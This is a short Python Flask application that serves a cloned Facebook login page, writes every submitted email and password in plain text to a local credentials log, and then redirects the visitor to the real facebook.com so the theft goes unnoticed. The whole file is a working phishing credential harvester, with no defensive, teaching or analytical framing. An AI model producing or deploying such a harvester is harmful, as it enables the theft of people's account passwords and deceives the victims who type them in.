
from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

@app.route('/')
def index():
    with open('templates/facebook/index.html') as f:
        return f.read()

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    with open('logs/saved_credentials.txt', 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")
    return redirect("https://facebook.com") 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
